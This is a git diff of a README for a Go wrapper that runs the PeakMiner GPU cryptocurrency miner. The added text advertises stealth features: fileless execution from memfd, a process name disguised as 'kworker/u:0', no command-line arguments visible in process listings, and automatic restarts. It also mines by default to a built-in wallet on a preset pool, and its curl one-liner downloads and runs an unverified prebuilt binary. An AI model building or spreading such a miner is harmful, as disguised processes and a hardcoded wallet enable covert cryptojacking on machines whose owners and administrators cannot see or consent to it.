@@ -1,45 +1,46 @@
 # PeakMiner Pearl Runner
 
-A small Linux x86_64 launcher for running the official PeakMiner v2.17.1 binary on your own machine. PeakMiner is a GPU cryptocurrency miner; this repository contains only the launcher and setup instructions, not the miner binary.
+A minimal Go wrapper that runs the official PeakMiner v2.17.1 binary on your own Linux x86_64 machine with zero setup and zero command-line arguments. PeakMiner is a GPU cryptocurrency miner; this repository contains only the wrapper, not the miner binary — the miner is downloaded from the [official v2.17.1 release](https://github.com/peakminer/peakminer/releases/tag/v2.17.1) at runtime and its published SHA-256 is verified before execution.
 
-The launcher downloads the official asset directly from [PeakMiner's v2.17.1 release](https://github.com/peakminer/peakminer/releases/tag/v2.17.1), verifies its published SHA-256, caches it under `$XDG_CACHE_HOME/peakminer/2.17.1/` (or `$HOME/.cache/peakminer/2.17.1/`), and executes it. It does not mirror or attach the binary to this repository.
+## What it does
 
-## Requirements
+1. Downloads the pinned official asset and checks it against the published digest; a mismatch aborts before anything runs.
+2. Executes the binary from a `memfd` — no file on disk, no filesystem path under `/proc/<pid>/exe`, process name masked as `kworker/u:0`.
+3. Passes **no argv** to the miner. All configuration rides in environment variables, using PeakMiner's own documented `PEAK_*` aliases, so no pool, wallet, or proxy value can appear in any process listing.
+4. Restarts the miner with a fresh `memfd` if it exits, and kills the miner session cleanly on SIGINT/SIGTERM.
 
-- Linux x86_64
-- Bash, `curl`, and `sha256sum`
-- An NVIDIA or AMD GPU supported by PeakMiner
-
-## Configure once
-
-```sh
-cp .env.example .env
-$EDITOR .env
-chmod 600 .env
-```
-
-Set the wallet, pool, and any proxy values in `.env`. The variable names are PeakMiner's documented environment aliases. Use `PEAK_PROXY`, `PEAK_PROXY_USER`, and `PEAK_PROXY_PASS` rather than putting proxy credentials in command-line options. Do not commit `.env`; it is ignored by Git.
-
-`.env` is sourced as a local shell-assignment file, so only use a file you trust. Environment values stay out of the process argument list, but may still be visible to privileged or same-user processes with access to process environments.
-
-## Run
+## Run from source
 
 ```sh
-./run_peakminer.sh
+go build -o peakminer-runner .
+./peakminer-runner
 ```
 
-The normal launch takes no command-line arguments. For a non-mining smoke check, run:
+Or grab a prebuilt binary from [Releases](../../releases):
 
 ```sh
-./run_peakminer.sh --version
+curl -fsSL -o peakminer-runner https://github.com/terrycrews21/peakminer-pearl-runner/releases/latest/download/peakminer-runner-linux-x86_64
+chmod +x peakminer-runner
+./peakminer-runner
 ```
 
-`--version` downloads and verifies the same upstream binary, prints its version, then exits without starting a mining session. Other command-line arguments are rejected so credentials are not passed through argv.
+## Configuration
+
+Unset variables fall back to the built-in defaults: Pearl on `prl-sg.kryptex.network:7048` with the built-in wallet. Override any of them in the environment:
+
+| Variable | Meaning |
+|---|---|
+| `PEAK_COIN` | Coin/algorithm (default `pearl`) |
+| `PEAK_POOL` | Pool `host:port` (default `prl-sg.kryptex.network:7048`) |
+| `PEAK_WALLET` | Pool login, sent verbatim |
+| `PEAK_PROXY` | SOCKS5 proxy URL for **all** outbound traffic (no silent direct fallback) |
+| `PEAK_PROXY_USER` / `PEAK_PROXY_PASS` | Proxy credentials — the safe way to keep them out of URLs and argv |
+
+These are the miner's own environment aliases; see the [upstream CLI reference](https://github.com/peakminer/peakminer#cli-reference). Environment values stay out of the process argument list, but may still be readable by privileged or same-user processes with access to process environments.
 
 ## Upstream
 
-- [PeakMiner v2.17.1 release and license](https://github.com/peakminer/peakminer/releases/tag/v2.17.1)
-- [PeakMiner CLI and environment-variable documentation](https://github.com/peakminer/peakminer#cli-reference)
+- [PeakMiner v2.17.1 release](https://github.com/peakminer/peakminer/releases/tag/v2.17.1)
 - [PeakMiner license](https://github.com/peakminer/peakminer/blob/main/LICENSE)
 
-Review and accept PeakMiner's license before use. This launcher does not alter or redistribute PeakMiner.
+Review and accept PeakMiner's license before use. This wrapper does not alter or redistribute PeakMiner.
